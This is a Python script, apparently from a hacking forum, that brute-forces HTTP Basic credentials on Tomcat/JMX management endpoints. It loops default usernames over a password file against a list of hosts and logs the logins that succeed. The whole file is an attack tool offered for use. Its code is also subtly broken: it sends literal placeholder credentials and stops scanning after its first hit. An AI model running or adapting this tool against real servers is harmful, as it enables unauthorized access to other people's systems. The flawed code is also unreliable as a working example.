#!/usr/bin/python3
"""
JMX Bruteforcer
Coded by tw!XX 4 FXP-TERMiNAL.iNFO
Python 3 ready. No Multi-Thread.
"""
import urllib.request
import base64

def scan():    
    users = ("admin","tomcat","manager","system","administrator")
    passes = open('password.txt','r').read().splitlines()
    hosts = open('jmx2brute.txt','r').read().splitlines()
    for host in hosts:
        FoundAccount = False
        NeedSSL = False
        for user in users:
            for password in passes:                
                request = urllib.request.Request(host)
                base64string = base64.b64encode(bytes('%s:%s' % ('user', 'password'),'ascii'))
                request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
                try:
                    result = urllib.request.urlopen(request)
                except urllib.error.HTTPError as e:                
                    print(e.code)
                    if e.code == 403:
                        logssl = open('use_ssl.txt','a')
                        logssl.write(host+" User: "+user+" Password: "+password+"\n")
                        logssl.close()
                        NeedSSL = True
                        break
                except urllib.error.URLError as e:
                    print(e)
                else:
                    if result.getcode() == 200:                    
                        logfile = open('bruted.txt','a')
                        logfile.write("Host: %s User: %s Password: %s\n" % (host,user,password))
                        logfile.close()                    
                        FoundAccount = True
                        break
        if FoundAccount == True:
            break
        if NeedSSL == True:
            break
scan()